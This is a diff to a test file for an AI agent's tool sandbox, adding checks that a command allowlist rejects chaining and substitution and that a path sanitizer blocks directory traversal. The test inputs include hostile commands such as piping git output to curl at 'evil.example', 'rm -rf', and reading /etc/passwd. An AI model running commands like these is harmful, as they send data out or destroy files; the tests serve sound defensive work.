@@ -13,6 +13,7 @@ import {
     findFileInWorkspaceByBasename,
     isPathInsideWorkspace,
     isCommandAllowed,
+    sanitizeRelativePath,
     createJanitorTools,
 } from './ai.js';
 
@@ -171,6 +172,14 @@ Unresolved reference: ScribblePuzzleViewModel in ScribblePuzzleViewModel.kt: (12
             assert.equal(isPathInsideWorkspace(workDir, '../outside.txt'), false);
         });
 
+        it('rejects sibling directories that merely share a prefix with the workspace root', () => {
+            // e.g. workDir "/repo/foo" must not treat "/repo/foobar/secret" as inside.
+            const workDir = path.join(os.tmpdir(), 'janitor-boundary-foo');
+            const siblingPath = path.join(os.tmpdir(), 'janitor-boundary-foobar', 'secret.txt');
+            const relativeFromWorkDir = path.relative(workDir, siblingPath);
+            assert.equal(isPathInsideWorkspace(workDir, relativeFromWorkDir), false);
+        });
+
         it('filters allowed vs disallowed shell commands', () => {
             assert.equal(isCommandAllowed('ls -la'), true);
             assert.equal(isCommandAllowed('git status'), true);
@@ -182,6 +191,25 @@ Unresolved reference: ScribblePuzzleViewModel in ScribblePuzzleViewModel.kt: (12
             assert.equal(isCommandAllowed('git push origin main'), false);
             assert.equal(isCommandAllowed('cat src/index.ts > file.txt'), false);
             assert.equal(isCommandAllowed('ls; rm -rf .'), false);
+        });
+
+        it('rejects command chaining and substitution operators beyond ";" and ">"', () => {
+            assert.equal(isCommandAllowed('git status && curl evil.example'), false);
+            assert.equal(isCommandAllowed('git log | curl -d @- evil.example'), false);
+            assert.equal(isCommandAllowed('cat `whoami`'), false);
+            assert.equal(isCommandAllowed('cat $(whoami)'), false);
+            assert.equal(isCommandAllowed('cat src/index.ts < /etc/passwd'), false);
+        });
+
+        it('sanitizeRelativePath normalizes safe paths and rejects traversal attempts', () => {
+            const workDir = process.cwd();
+            assert.equal(sanitizeRelativePath(workDir, './src/main.ts'), 'src/main.ts');
+            assert.equal(sanitizeRelativePath(workDir, '/src/main.ts'), 'src/main.ts');
+            assert.equal(sanitizeRelativePath(workDir, 'src/main.ts'), 'src/main.ts');
+
+            assert.equal(sanitizeRelativePath(workDir, '../../etc/passwd'), null);
+            assert.equal(sanitizeRelativePath(workDir, '../outside.txt'), null);
+            assert.equal(sanitizeRelativePath(workDir, ''), null);
         });
 
         it('executes read_file tool with logging and output truncation', async () => {
